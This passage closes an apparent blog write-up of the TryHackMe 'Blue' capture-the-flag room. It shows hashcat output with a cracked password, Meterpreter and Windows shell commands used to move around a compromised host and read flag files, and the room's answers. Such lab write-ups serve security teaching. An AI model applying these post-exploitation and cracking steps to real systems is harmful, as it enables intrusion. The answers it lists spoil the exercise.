</span></span><span style=display:flex><span>Speed.#2.........:  3946.0 kH/s <span style=color:#f92672>(</span>7.80ms<span style=color:#f92672>)</span> @ Accel:64 Loops:1 Thr:64 Vec:1
</span></span><span style=display:flex><span>Recovered........: 1/1 <span style=color:#f92672>(</span>100.00%<span style=color:#f92672>)</span> Digests, 1/1 <span style=color:#f92672>(</span>100.00%<span style=color:#f92672>)</span> Salts
</span></span><span style=display:flex><span>Progress.........: 10223616/14344384 <span style=color:#f92672>(</span>71.27%<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Rejected.........: 0/10223616 <span style=color:#f92672>(</span>0.00%<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Restore.Point....: 10027008/14344384 <span style=color:#f92672>(</span>69.90%<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
</span></span><span style=display:flex><span>Candidates.#2....: april669 -&gt; alisonodonnell1
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Started: Fri Mar <span style=color:#ae81ff>20</span> 16:12:27 <span style=color:#ae81ff>2020</span>
</span></span><span style=display:flex><span>Stopped: Fri Mar <span style=color:#ae81ff>20</span> 16:12:34 <span style=color:#ae81ff>2020</span>
</span></span></code></pre></div><p><strong>Copy this password hash to a file and research how to crack it. What is the cracked password?</strong></p><ul><li>alqfna22</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>meterpreter &gt; cd C:/
</span></span><span style=display:flex><span>meterpreter &gt; pwd
</span></span><span style=display:flex><span>C:<span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>meterpreter &gt; ls
</span></span><span style=display:flex><span>Listing: C:<span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span><span style=color:#f92672>============</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Mode              Size     Type  Last modified              Name
</span></span><span style=display:flex><span>----              ----     ----  -------------              ----
</span></span><span style=display:flex><span>40777/rwxrwxrwx   <span style=color:#ae81ff>0</span>        dir   2009-07-14 05:18:56 +0200  $Recycle.Bin
</span></span><span style=display:flex><span>40777/rwxrwxrwx   <span style=color:#ae81ff>0</span>        dir   2009-07-14 07:08:56 +0200  Documents and Settings
</span></span><span style=display:flex><span>40777/rwxrwxrwx   <span style=color:#ae81ff>0</span>        dir   2009-07-14 05:20:08 +0200  PerfLogs
</span></span><span style=display:flex><span>40555/r-xr-xr-x   <span style=color:#ae81ff>4096</span>     dir   2009-07-14 05:20:08 +0200  Program Files
</span></span><span style=display:flex><span>40555/r-xr-xr-x   <span style=color:#ae81ff>4096</span>     dir   2009-07-14 05:20:08 +0200  Program Files <span style=color:#f92672>(</span>x86<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>40777/rwxrwxrwx   <span style=color:#ae81ff>4096</span>     dir   2009-07-14 05:20:08 +0200  ProgramData
</span></span><span style=display:flex><span>40777/rwxrwxrwx   <span style=color:#ae81ff>0</span>        dir   2018-12-13 04:13:22 +0100  Recovery
</span></span><span style=display:flex><span>40777/rwxrwxrwx   <span style=color:#ae81ff>4096</span>     dir   2018-12-13 00:01:17 +0100  System Volume Information
</span></span><span style=display:flex><span>40555/r-xr-xr-x   <span style=color:#ae81ff>4096</span>     dir   2009-07-14 05:20:08 +0200  Users
</span></span><span style=display:flex><span>40777/rwxrwxrwx   <span style=color:#ae81ff>16384</span>    dir   2009-07-14 05:20:08 +0200  Windows
</span></span><span style=display:flex><span>100666/rw-rw-rw-  <span style=color:#ae81ff>24</span>       fil   2018-12-13 04:47:39 +0100  flag1.txt
</span></span><span style=display:flex><span>0000/---------    <span style=color:#ae81ff>3089184</span>  fif   1970-02-07 00:26:08 +0100  hiberfil.sys
</span></span><span style=display:flex><span>0000/---------    <span style=color:#ae81ff>3089184</span>  fif   1970-02-07 00:26:08 +0100  pagefile.sys
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>meterpreter &gt; cat flag1.txt 
</span></span><span style=display:flex><span>flag<span style=color:#f92672>{</span>access_the_machine<span style=color:#f92672>}</span>
</span></span></code></pre></div><p><strong>Flag1? (Only submit the flag contents {CONTENTS})</strong></p><ul><li>access_the_machine</li></ul><p>For final steps, we return back to first session with basic command shell.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>meterpreter &gt; 
</span></span><span style=display:flex><span>Background session 2? <span style=color:#f92672>[</span>y/N<span style=color:#f92672>]</span>                                                    
</span></span><span style=display:flex><span>msf5 post<span style=color:#f92672>(</span>multi/manage/shell_to_meterpreter<span style=color:#f92672>)</span> &gt; 
</span></span><span style=display:flex><span>msf5 post<span style=color:#f92672>(</span>multi/manage/shell_to_meterpreter<span style=color:#f92672>)</span> &gt; sessions <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Starting interaction with 1...                                             
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                                                                               
</span></span><span style=display:flex><span>                                                                               
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                                       
</span></span><span style=display:flex><span>Name             : ConsoleHost                                                 
</span></span><span style=display:flex><span>Version          : 2.0                                                         
</span></span><span style=display:flex><span>InstanceId       : 6ab0de61-c602-4a6d-93f5-77a4f1f1c239
</span></span><span style=display:flex><span>UI               : System.Management.Automation.Internal.Host.InternalHostUserI 
</span></span><span style=display:flex><span>                   nterface                                                    
</span></span><span style=display:flex><span>CurrentCulture   : en-US          
</span></span><span style=display:flex><span>CurrentUICulture : en-US                                                       
</span></span><span style=display:flex><span>PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy
</span></span><span style=display:flex><span>IsRunspacePushed : False             
</span></span><span style=display:flex><span>Runspace         : System.Management.Automation.Runspaces.LocalRunspace
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>TJACJVXvCYTTfrcbvutJpyWlidgPcITh
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\s</span>ystem32&gt;cd C:<span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>cd C:<span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>
</span></span><span style=display:flex><span>C:<span style=color:#ae81ff>\&gt;</span>dir flag* /s /p
</span></span><span style=display:flex><span>dir flag* /s /p
</span></span><span style=display:flex><span> Volume in drive C has no label.
</span></span><span style=display:flex><span> Volume Serial Number is E611-0B66
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span> Directory of C:<span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>
</span></span><span style=display:flex><span>03/17/2019  02:27 PM                <span style=color:#ae81ff>24</span> flag1.txt
</span></span><span style=display:flex><span>               <span style=color:#ae81ff>1</span> File<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span>             <span style=color:#ae81ff>24</span> bytes
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span> Directory of C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\J</span>on<span style=color:#ae81ff>\A</span>ppData<span style=color:#ae81ff>\R</span>oaming<span style=color:#ae81ff>\M</span>icrosoft<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\R</span>ecent
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>03/17/2019  02:26 PM               <span style=color:#ae81ff>482</span> flag1.lnk
</span></span><span style=display:flex><span>03/17/2019  02:30 PM               <span style=color:#ae81ff>848</span> flag2.lnk
</span></span><span style=display:flex><span>03/17/2019  02:32 PM             2,344 flag3.lnk
</span></span><span style=display:flex><span>               <span style=color:#ae81ff>3</span> File<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span>          3,674 bytes
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span> Directory of C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\J</span>on<span style=color:#ae81ff>\D</span>ocuments
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>03/17/2019  02:26 PM                <span style=color:#ae81ff>37</span> flag3.txt
</span></span><span style=display:flex><span>               <span style=color:#ae81ff>1</span> File<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span>             <span style=color:#ae81ff>37</span> bytes
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span> Directory of C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>ystem32<span style=color:#ae81ff>\c</span>onfig
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>03/17/2019  02:32 PM                <span style=color:#ae81ff>34</span> flag2.txt
</span></span><span style=display:flex><span>               <span style=color:#ae81ff>1</span> File<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span>             <span style=color:#ae81ff>34</span> bytes
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>     Total Files Listed:
</span></span><span style=display:flex><span>               <span style=color:#ae81ff>6</span> File<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span>          3,769 bytes
</span></span><span style=display:flex><span>               <span style=color:#ae81ff>0</span> Dir<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span>  22,707,953,664 bytes free
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>C:<span style=color:#ae81ff>\&gt;</span>type C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>ystem32<span style=color:#ae81ff>\c</span>onfig<span style=color:#ae81ff>\f</span>lag2.txt
</span></span><span style=display:flex><span>type C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>ystem32<span style=color:#ae81ff>\c</span>onfig<span style=color:#ae81ff>\f</span>lag2.txt
</span></span><span style=display:flex><span>flag<span style=color:#f92672>{</span>sam_database_elevated_access<span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>C:<span style=color:#ae81ff>\&gt;</span>type C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\J</span>on<span style=color:#ae81ff>\D</span>ocuments<span style=color:#ae81ff>\f</span>lag3.txt
</span></span><span style=display:flex><span>type C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\J</span>on<span style=color:#ae81ff>\D</span>ocuments<span style=color:#ae81ff>\f</span>lag3.txt
</span></span><span style=display:flex><span>flag<span style=color:#f92672>{</span>admin_documents_can_be_valuable<span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>C:<span style=color:#ae81ff>\&gt;</span>
</span></span></code></pre></div><p><strong>Flag2? *Errata: Windows really doesn&rsquo;t like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen.</strong></p><ul><li>sam_database_elevated_access</li></ul><p><strong>flag3?</strong></p><ul><li>admin_documents_can_be_valuable</li></ul><p>And that&rsquo;s it, we have NT AUTHORITY\SYSTEM priviledges, we have all the flags, cracked Jon password. We&rsquo;re done here!
I hope you enjoyed it,
bye;)</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://burso.eu/tags/ctf/>ctf</a></li><li><a href=https://burso.eu/tags/eternalblue/>eternalblue</a></li><li><a href=https://burso.eu/tags/hashcat/>hashcat</a></li><li><a href=https://burso.eu/tags/metasploit/>metasploit</a></li><li><a href=https://burso.eu/tags/ms17-010/>MS17-010</a></li><li><a href=https://burso.eu/tags/tryhackme/>tryhackme</a></li></ul><nav class=paginav><a class=prev href=https://burso.eu/posts/inclusion/><span class=title>« Prev Page</span><br><span>Inclusion</span></a>
<a class=next href=https://burso.eu/posts/bookface/><span class=title>Next Page »</span><br><span>Bookface</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share Blue on twitter" href="https://twitter.com/intent/tweet/?text=Blue&url=https%3a%2f%2fburso.eu%2fposts%2fblue%2f&hashtags=ctf%2ceternalblue%2chashcat%2cmetasploit%2cMS17-010%2ctryhackme"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Blue on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fburso.eu%2fposts%2fblue%2f&title=Blue&summary=Blue&source=https%3a%2f%2fburso.eu%2fposts%2fblue%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Blue on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fburso.eu%2fposts%2fblue%2f&title=Blue"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Blue on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fburso.eu%2fposts%2fblue%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Blue on whatsapp" href="https://api.whatsapp.com/send?text=Blue%20-%20https%3a%2f%2fburso.eu%2fposts%2fblue%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Blue on telegram" href="https://telegram.me/share/url?text=Blue&url=https%3a%2f%2fburso.eu%2fposts%2fblue%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2022 <a href=https://burso.eu/>.burso | blog about ctf & anything else</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(t){t.preventDefault();var e=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView({behavior:"smooth"}),e==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${e}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>